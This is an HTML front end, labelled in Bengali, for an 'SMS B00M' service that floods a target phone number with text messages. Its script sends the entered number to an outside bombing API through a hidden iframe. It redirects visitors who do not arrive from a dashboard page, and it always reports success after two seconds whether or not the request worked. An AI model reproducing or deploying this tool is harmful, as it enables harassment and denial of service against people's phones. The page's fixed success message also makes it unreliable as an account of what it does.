<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS B00M | SPECIAL CELL</title>
  <style>
    /* ১. বডি ও থিম */
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      background: radial-gradient(circle at top, #00111a 0%, #000000 100%);
      font-family: "Poppins", sans-serif;
      color: #00eaff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .boom-container {
      margin-top: -50px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 90%;
      max-width: 400px;
      padding: 40px 20px;
      border-radius: 15px;
      background: #001820;
      box-shadow: 0 0 25px #00eaff88;
    }
    h1 {
      font-size: 24px;
      font-weight: bold;
      text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff;
      margin-bottom: 5px;
    }
    /* ২. ইনপুট ও বাটন স্টাইল */
    input[type="number"] {
      padding: 15px;
      border-radius: 8px;
      border: 2px solid #00eaff;
      background: #000a10;
      color: #00eaff;
      font-size: 18px;
      text-align: center;
      box-shadow: 0 0 10px #00eaff88;
      outline: none;
      transition: border-color 0.3s;
    }
    .btn {
      padding: 15px;
      border-radius: 12px;
      background: #002a33;
      color: #00eaff;
      font-size: 20px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      text-shadow: 0 0 10px #00eaff;
      box-shadow: 0 0 20px #00eaffaa;
      transition: 0.3s;
    }
    .btn:hover {
      transform: scale(1.03);
      background: #004455;
    }
    /* ৩. ড্যাশবোর্ড বাটন স্টাইল */
    .dashboard-link-btn {
        padding: 15px;
        border-radius: 12px;
        background: #330044;
        color: #ff00ff;
        font-size: 18px;
        font-weight: bold;
        border: none;
        cursor: pointer;
        text-shadow: 0 0 8px #ff00ff;
        box-shadow: 0 0 15px #ff00ff88;
        text-decoration: none;
        display: block;
        text-align: center;
        transition: 0.3s;
    }
    .dashboard-link-btn:hover {
        transform: scale(1.03);
        background: #550066;
    }
    /* ৪. স্ট্যাটাস মেসেজ স্টাইল */
    #status {
      margin-top: 5px;
      font-size: 16px;
      min-height: 20px;
      color: #00ffaa;
      text-shadow: 0 0 8px #00ffaa;
    }
  </style>

  <script>
    (function() {
      const referrer = document.referrer;
      const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 

      let isAllowed = false;
      for (const allowed of allowedReferrers) {
          if (referrer.includes(allowed)) {
              isAllowed = true;
              break;
          }
      }

      if (!isAllowed) {
          window.location.replace('index.html');
      }
    })();
  </script>
</head>
<body>

  <div class="boom-container">
    
    <h1>আপনার কলিজার নম্বর দেন</h1>
    
    <input 
      type="number" 
      id="targetNumber" 
      placeholder="017********" 
      pattern="[0-9]*" 
      inputmode="numeric" 
      maxlength="11"
      required
    />
    
    <button class="btn" onclick="triggerSMSBoom()">গুতা দেন</button>

    <div id="status"></div>

    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a>
  </div>

  <script>
    function triggerSMSBoom() {
        const numberInput = document.getElementById('targetNumber');
        const statusDiv = document.getElementById('status');
        const number = numberInput.value.trim();
        
        // ১. ইনপুট ভ্যালিডেশন
        if (!number || number.length < 10) {
            statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
            statusDiv.style.color = '#ff0055'; 
            statusDiv.style.textShadow = '0 0 8px #ff0055';
            return;
        }

        // ২. API URL
        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
        
        // স্ট্যাটাস আপডেট
        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে... (প্রচেষ্টা চলছে)';
        statusDiv.style.color = '#00eaff';
        statusDiv.style.textShadow = '0 0 8px #00eaff';

        // ৩. পুরোনো Iframe মুছে ফেলা
        const oldIframe = document.getElementById('api-iframe');
        if (oldIframe) {
            oldIframe.remove();
        }

        // ৪. নতুন Invisible Iframe তৈরি এবং কল শুরু করা
        const iframe = document.createElement('iframe');
        iframe.id = 'api-iframe';
        iframe.style.display = 'none'; // অদৃশ্য
        iframe.src = apiUrl;
        
        document.body.appendChild(iframe);

        // ৫. টাইমআউট দিয়ে নিশ্চিতকরণ এবং Iframe মুছে ফেলা
        // এটি ব্রাউজারের ত্রুটি (যেমন Mixed Content Blocking) এড়িয়ে দ্রুত সফল বার্তা দেখাবে
        setTimeout(() => {
            if (statusDiv.textContent.includes('শুরু হচ্ছে...')) {
                // Iframe লোড হোক বা না হোক, এই সময়ে সফল বার্তা দেখাবে
                statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
                statusDiv.style.color = '#00ffaa'; 
                statusDiv.style.textShadow = '0 0 8px #00ffaa';
            }
            
            // Iframe-টি DOM থেকে মুছে ফেলা
            const iframeToRemove = document.getElementById('api-iframe');
            if (iframeToRemove) {
                 iframeToRemove.remove();
            }

        }, 2000); // ২ সেকেন্ড পর সফলতার বার্তা দেখাবে এবং Iframe সরিয়ে দেবে।
    }
  </script>
</body>
</html>
